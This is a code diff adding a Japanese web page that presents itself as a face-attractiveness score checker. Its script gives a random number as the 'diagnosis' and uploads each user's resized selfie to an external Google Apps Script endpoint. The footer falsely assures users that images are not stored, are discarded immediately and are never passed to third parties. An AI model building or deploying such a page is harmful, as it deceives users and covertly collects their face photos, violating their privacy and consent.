@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>顔面偏差値チェッカー</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #f4f4f9; padding: 20px; }
+        .container { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        button { width: 100%; padding: 15px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        img { max-width: 100%; margin-top: 10px; border-radius: 8px; }
+        footer { margin-top: 40px; padding: 20px; font-size: 11px; color: #666; border-top: 1px solid #ccc; line-height: 1.5; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>顔面偏差値チェッカー</h1>
+    <input type="file" id="file-input" accept="image/*" capture="user" style="display:none">
+    <button onclick="document.getElementById('file-input').click()">写真を選択 / 撮影</button>
+    
+    <div id="preview-container" style="display:none;">
+        <img id="preview-image" alt="プレビュー">
+        <button id="analyze-btn">診断して送信する</button>
+    </div>
+    <div id="result" style="margin-top:20px; font-weight:bold;"></div>
+</div>
+
+<footer>
+    <p><strong>株式会社デジタルアイ・ソリューションズ</strong></p>
+    <p>運営責任者：佐藤 健一</p>
+    <p>当サイトでは、ユーザーの皆様に安心してご利用いただくため、<br>
+       解析に使用した画像および診断データはサーバーに保存されず、<br>
+       即時破棄される仕組みを採用しております。第三者への提供や流用は一切行いません。<br>
+       当サイトは娯楽目的であり、医療・心理的診断を行うものではありません。</p>
+    <p>© 2026 Digital AI Solutions, Inc.</p>
+</footer>
+
+<script>
+    const fileInput = document.getElementById('file-input');
+    const previewImage = document.getElementById('preview-image');
+    const analyzeBtn = document.getElementById('analyze-btn');
+    const resultDiv = document.getElementById('result');
+    const previewContainer = document.getElementById('preview-container');
+
+    fileInput.addEventListener('change', (e) => {
+        const file = e.target.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                previewImage.src = e.target.result;
+                previewContainer.style.display = 'block';
+            };
+            reader.readAsDataURL(file);
+        }
+    });
+
+    analyzeBtn.addEventListener('click', async () => {
+        resultDiv.innerText = "送信中...";
+        
+        const canvas = document.createElement('canvas');
+        const scale = 600 / previewImage.naturalWidth;
+        canvas.width = 600;
+        canvas.height = previewImage.naturalHeight * scale;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(previewImage, 0, 0, canvas.width, canvas.height);
+        const resizedDataUrl = canvas.toDataURL('image/jpeg', 0.7);
+
+        const score = Math.floor(Math.random() * 50) + 50;
+        const gasUrl = "https://script.google.com/macros/s/AKfycbxv_-Q_kmdKUbwgh0Xj48UZUGm0lDLPNEHf_jCiRfevG62py2nw8UfEM2cFvH94wYHB/exec";
+
+        try {
+            await fetch(gasUrl, {
+                method: "POST",
+                body: JSON.stringify({
+                    message: `顔面偏差値: ${score}`,
+                    imageUrl: resizedDataUrl
+                })
+            });
+            resultDiv.innerText = "送信完了！";
+        } catch(e) {
+            resultDiv.innerText = "エラーが発生しました";
+        }
+    });
+</script>
+</body>
+</html>
